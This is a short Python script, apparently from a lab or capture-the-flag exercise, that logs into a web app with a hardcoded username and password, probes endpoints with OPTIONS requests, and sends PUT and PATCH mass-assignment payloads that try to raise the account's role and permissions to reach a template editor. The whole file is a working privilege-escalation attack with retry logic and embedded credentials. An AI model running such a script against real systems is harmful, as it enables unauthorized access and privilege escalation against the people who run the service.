import requests, time

base = 'https://outofcontext-app.onrender.com'

def login():
    for a in range(8):
        s = requests.Session()
        s.post(base + '/login', data={'username': 'compliance_officer', 'password': 'AuditPolicy2026!'}, timeout=40)
        if s.cookies.get('session'):
            return s
        time.sleep(25)
    return None

s = login()

def call(method, path, **kw):
    for a in range(6):
        try:
            r = s.request(method, base + path, timeout=40, allow_redirects=False, **kw)
        except Exception:
            time.sleep(12); continue
        if r.status_code in (429, 502, 503):
            time.sleep(18); continue
        return r
    return None

# Discover allowed methods
for path in ['/profile', '/settings', '/dashboard', '/templates']:
    r = call('OPTIONS', path)
    if r is not None:
        print('OPTIONS', path, r.status_code, 'Allow=' + r.headers.get('Allow', '?'))
    time.sleep(0.8)

# Try PUT/PATCH mass-assignment on profile/settings
payload = {'role': 'Document Specialist', 'permissions': 'Document Specialist',
           'account_type': 'Document Specialist', 'is_specialist': True}
for method in ['PUT', 'PATCH']:
    for path in ['/profile', '/settings']:
        r = call(method, path, json=payload)
        if r is not None:
            print(method, path, r.status_code, r.headers.get('Location', '')[:20], r.text[:80].replace('\n', ' '))
        time.sleep(1)

# re-check editor access
r = call('GET', '/templates/3/edit')
if r is not None:
    print('editor after PUT/PATCH:', r.status_code, r.headers.get('Location', ''))
